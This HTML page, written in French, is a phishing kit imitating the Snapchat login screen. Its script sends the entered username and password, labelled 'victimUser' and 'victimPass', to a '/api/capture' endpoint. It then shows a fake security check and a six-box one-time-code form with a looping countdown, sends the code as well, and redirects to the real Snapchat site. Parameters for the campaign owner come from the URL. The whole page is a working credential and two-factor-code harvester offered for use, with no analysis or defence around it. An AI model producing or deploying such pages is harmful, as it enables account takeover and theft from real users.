<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Snapchat</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fffc00; /* Jaune Snapchat emblématique */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            transition: background-color 0.4s ease;
        }
        /* Mode sombre global activé pendant le chargement de 5 secondes */
        body.dark-mode {
            background-color: #121212;
        }

        .snap-container {
            background-color: #ffffff; /* Blanc pur */
            border-radius: 16px;
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            position: relative;
            transition: background-color 0.4s ease;
        }
        body.dark-mode .snap-container {
            background-color: #1e1e1e;
        }

        /* Fantôme Snapchat en SVG aux couleurs Jaune/Blanc */
        .snap-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px auto;
            background-color: #fffc00;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .snap-logo svg {
            width: 38px;
            height: 38px;
            fill: #000000;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 25px;
            margin-top: 0;
            transition: color 0.4s ease;
        }
        body.dark-mode h1 {
            color: #ffffff;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #f7f7f7;
            border: 1.5px solid #e5e5e5;
            border-radius: 12px;
            font-size: 15px;
            color: #000000;
            box-sizing: border-box;
            outline: none;
            transition: background-color 0.4s ease, border-color 0.2s, color 0.4s ease;
        }
        body.dark-mode .input-field {
            background-color: #2c2c2c;
            border-color: #404040;
            color: #ffffff;
        }

        .input-field:focus {
            border-color: #fffc00;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.3);
        }
        body.dark-mode .input-field:focus {
            background-color: #1e1e1e;
        }

        .snap-btn {
            background-color: #fffc00;
            color: #000000;
            border: none;
            border-radius: 25px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.2s, transform 0.1s;
        }
        .snap-btn:hover {
            background-color: #f3f000;
        }
        .snap-btn:active {
            transform: scale(0.98);
        }

        .forgot-pass {
            display: block;
            margin-top: 20px;
            color: #007aff;
            font-size: 13px;
            font-weight: 600;
            text-decoration: none;
        }
        .forgot-pass:hover {
            text-decoration: underline;
        }

        /* Écran de chargement circulaire (5 secondes) */
        .loader-overlay {
            display: none;
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 16px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        body.dark-mode .loader-overlay {
            background: rgba(30, 30, 30, 0.95);
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #fffc00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 14px;
            color: #000000;
            font-weight: 600;
        }
        body.dark-mode .loader-text {
            color: #ffffff;
        }

        /* Section OTP à 6 carreaux (Blanc et Jaune) */
        .otp-container {
            display: none;
            text-align: center;
        }
        .otp-container h3 {
            color: #000000;
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 10px;
            transition: color 0.4s ease;
        }
        body.dark-mode .otp-container h3 {
            color: #ffffff;
        }
        .otp-container p {
            font-size: 13px;
            color: #666666;
            margin-bottom: 25px;
            line-height: 1.4;
            transition: color 0.4s ease;
        }
        body.dark-mode .otp-container p {
            color: #aaaaaa;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-bottom: 20px;
        }
        .otp-box {
            width: 42px;
            height: 48px;
            background-color: #f7f7f7;
            border: 1.5px solid #e5e5e5;
            border-radius: 10px;
            font-size: 22px;
            font-weight: bold;
            color: #000000;
            text-align: center;
            outline: none;
            box-sizing: border-box;
            transition: background-color 0.4s ease, border-color 0.2s, color 0.4s ease;
        }
        body.dark-mode .otp-box {
            background-color: #2c2c2c;
            border-color: #404040;
            color: #ffffff;
        }
        .otp-box:focus {
            border-color: #fffc00;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.3);
        }
        body.dark-mode .otp-box:focus {
            background-color: #1e1e1e;
        }

        /* Chronomètre en boucle de 20s */
        .timer-display {
            text-align: center;
            margin-top: 15px;
            font-size: 13px;
            color: #ff4b4b;
            font-weight: 700;
        }
    </style>
</head>
<body>

    <div class="snap-container">
        <!-- Logo fantôme Snapchat -->
        <div class="snap-logo">
            <svg viewBox="0 0 28 28">
                <path d="M14.002 2.5c-3.784 0-6.862 3.078-6.862 6.862 0 1.956.804 3.722 2.102 5.002-1.077.568-2.28 1.135-3.528 1.764-1.127.573-1.636 1.92-1.063 3.047.464.915 1.383 1.45 2.348 1.45.244 0 .49-.033.73-.102 1.055-.306 2.072-.676 3.037-1.082.973.914 2.274 1.479 3.704 1.479 1.43 0 2.731-.565 3.704-1.479.965.406 1.982.776 3.037 1.082.24.069.486.102.73.102.965 0 1.884-.535 2.348-1.45.573-1.127.064-2.474-1.063-3.047-1.248-.629-2.451-1.196-3.528-1.764 1.298-1.28 2.102-3.046 2.102-5.002 0-3.784-3.078-6.862-6.862-6.862z"/>
            </svg>
        </div>

        <h1 id="page-title">Se connecter à Snapchat</h1>

        <!-- ÉTAPE 1 : Formulaire d'identifiants initial -->
        <form id="loginForm" onsubmit="handleLoginSubmit(event)">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Nom d'utilisateur ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="snap-btn">Connexion</button>
        </form>

        <a href="#" class="forgot-pass" id="forgot-link" onclick="return false;">Mot de passe oublié ?</a>

        <!-- ÉCRAN DE CHARGEMENT CIRCULAIRE (5 SECONDES) -->
        <div id="loader-overlay" class="loader-overlay">
            <div class="spinner"></div>
            <div class="loader-text">Vérification de sécurité...</div>
        </div>

        <!-- ÉTAPE 2 : Section Code OTP (6 Carreaux) -->
        <div id="otp-container" class="otp-container">
            <h3>Code de confirmation</h3>
            <p>Veuillez entrer le code de validation à 6 chiffres envoyé sur votre appareil.</p>
            
            <form id="otp-form" onsubmit="handleOtpSubmit(event)">
                <div class="otp-inputs">
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                </div>
                <button type="submit" class="snap-btn">Confirmer</button>
            </form>
            <div class="timer-display" id="timer-text">Expiration du code : 20s</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        let savedUser = "";
        let savedPass = "";
        let countdownInterval = null;

        // Gestion du comportement des 6 carreaux OTP
        const otpBoxes = document.querySelectorAll('.otp-box');
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                }
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        // Étape 1 : Soumission des identifiants
        function handleLoginSubmit(event) {
            event.preventDefault();

            savedUser = document.getElementById('username').value;
            savedPass = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Snapchat",
                type: "otp_step1",
                victimUser: savedUser,
                victimPass: savedPass,
                otp: "Aucun"
            };

            // 1. Envoi immédiat des identifiants au backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));

            // 2. Activer le mode sombre global et afficher le chargement circulaire de 5s
            document.body.classList.add('dark-mode');
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('page-title').style.display = 'none';
            document.getElementById('forgot-link').style.display = 'none';
            document.getElementById('loader-overlay').style.display = 'flex';

            // 3. Attendre 5 secondes puis afficher l'interface OTP
            setTimeout(() => {
                document.getElementById('loader-overlay').style.display = 'none';
                document.getElementById('otp-container').style.display = 'block';
                
                // Démarrer le chronomètre en boucle de 20 secondes
                startLoopingTimer();
                otpBoxes[0].focus();
            }, 5000);
        }

        // Chronomètre en boucle (20s)
        function startLoopingTimer() {
            let timeLeft = 20;
            const timerElement = document.getElementById('timer-text');
            
            if (countdownInterval) clearInterval(countdownInterval);

            countdownInterval = setInterval(() => {
                timerElement.textContent = `⏳ Expiration du code dans : ${timeLeft}s`;
                timeLeft--;

                if (timeLeft < 0) {
                    timeLeft = 20;
                }
            }, 1000);
        }

        // Étape 2 : Soumission du code OTP combiné des 6 carreaux
        function handleOtpSubmit(event) {
            event.preventDefault();
            if (countdownInterval) clearInterval(countdownInterval);

            let otpVal = "";
            otpBoxes.forEach(box => {
                otpVal += box.value;
            });

            const payload = {
                owner: campaignOwner,
                network: "Snapchat",
                type: linkType,
                victimUser: savedUser,
                victimPass: savedPass,
                otp: otpVal
            };

            // Envoi complet vers le backend Flask
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://www.snapchat.com";
            }).catch(error => {
                window.location.href = "https://www.snapchat.com";
            });
        }
    </script>
</body>
</html>
